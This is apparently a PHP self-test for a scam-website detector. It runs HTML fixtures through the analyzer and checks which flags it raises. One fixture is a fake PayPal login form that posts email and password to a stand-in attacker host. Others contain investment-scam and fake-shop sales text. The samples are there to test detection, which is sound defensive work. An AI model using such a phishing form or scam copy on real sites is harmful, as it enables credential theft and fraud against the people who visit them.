<?php
/**
 * Offline self-test for ScamBehaviorAnalyzer (+ provisional signal shape).
 * php cron/selftest-behavior.php
 */
declare(strict_types=1);

$root = dirname(__DIR__);
// Avoid pulling full app bootstrap (DB config) — analyzer is standalone.
if (!function_exists('registrable_domain')) {
    function registrable_domain(string $host): ?string
    {
        $host = strtolower(trim($host));
        $parts = array_values(array_filter(explode('.', $host)));
        if (count($parts) < 2) {
            return $host !== '' ? $host : null;
        }
        return $parts[count($parts) - 2] . '.' . $parts[count($parts) - 1];
    }
}
require_once $root . '/includes/ScamBehaviorAnalyzer.php';

$fail = 0;
$pass = 0;

function expect(bool $cond, string $msg): void
{
    global $fail, $pass;
    if ($cond) {
        echo "[PASS] $msg\n";
        $pass++;
    } else {
        echo "[FAIL] $msg\n";
        $fail++;
    }
}

function signals_look_provisional(array $signals): bool
{
    foreach ($signals as $s) {
        if (($s['label'] ?? '') === 'Scan depth'
            && stripos((string) ($s['value'] ?? ''), 'provisional') !== false) {
            return true;
        }
    }
    return false;
}

// 1) Off-site credential form + brand mismatch
$htmlPhish = '<html><head><title>PayPal Login</title></head><body>'
    . '<form action="https://evil-collector.test/steal" method="post">'
    . '<input type="text" name="email"><input type="password" name="password">'
    . '</form></body></html>';
$r1 = ScamBehaviorAnalyzer::analyze('totally-unrelated-bank.test', $htmlPhish, 'PayPal Login', '');
$codes1 = array_column($r1['flags'], 'code');
expect(in_array('credential_form_offsite', $codes1, true), 'detects off-site credential form');
expect(in_array('brand_content_mismatch', $codes1, true), 'detects PayPal brand mismatch on unrelated domain');
expect(!empty($r1['evidence']['quotes']) || !empty($r1['evidence']['brands_mentioned']), 'builds AI evidence pack');

// 2) On-domain login should NOT flag offsite
$htmlOk = '<html><head><title>Acme Login</title></head><body>'
    . '<form action="/login" method="post">'
    . '<input type="password" name="password"></form></body></html>';
$r2 = ScamBehaviorAnalyzer::analyze('acme.example', $htmlOk, 'Acme Login', '');
$codes2 = array_column($r2['flags'], 'code');
expect(!in_array('credential_form_offsite', $codes2, true), 'on-domain password form is not offsite phishing');

// 3) Investment scam language needs corroboration
$htmlInvest = '<html><body>Guaranteed daily profit 20% per day. Double your money this week. '
    . 'Minimum deposit $100 USDT. Contact us on Telegram for withdrawal fee.</body></html>';
$r3 = ScamBehaviorAnalyzer::analyze('hyperyield-roi.test', $htmlInvest, 'Daily ROI', '');
$codes3 = array_column($r3['flags'], 'code');
expect(in_array('investment_scam_language', $codes3, true), 'detects corroborated investment scam language');

// 4) Single weak investment cue alone should not hard-flag
$htmlWeak = '<html><body>Learn about fixed returns in retirement planning with our newsletter.</body></html>';
$r4 = ScamBehaviorAnalyzer::analyze('finance-blog.test', $htmlWeak, 'Finance tips', '');
$codes4 = array_column($r4['flags'], 'code');
expect(!in_array('investment_scam_language', $codes4, true), 'single weak investment phrase is not a hard flag');

// 5) Fake shop pack
$htmlShop = '<html><body>Add to cart. 90% off flash sale today only. Pay via WhatsApp. '
    . 'All sales final. Hurry limited stock. Lorem ipsum sample address.</body></html>';
$r5 = ScamBehaviorAnalyzer::analyze('cheap-replicas.test', $htmlShop, 'Mega Sale', '');
$codes5 = array_column($r5['flags'], 'code');
expect(
    in_array('fake_shop_pattern', $codes5, true) || in_array('fake_shop_pattern_soft', $codes5, true),
    'detects fake-shop cue pack'
);

// 6) Provisional signal shape used by UI/repo helpers
$provSignals = [
    ['group' => 'content', 'label' => 'Scan depth', 'value' => 'Provisional discovery', 'tone' => 'warn'],
];
$fullSignals = [
    ['group' => 'content', 'label' => 'Scan depth', 'value' => 'Full live check', 'tone' => 'good'],
];
expect(signals_look_provisional($provSignals) === true, 'provisional scan-depth signal detected');
expect(signals_look_provisional($fullSignals) === false, 'full scan-depth signal not provisional');

echo "\nResult: $pass passed, $fail failed\n";
exit($fail > 0 ? 1 : 0);
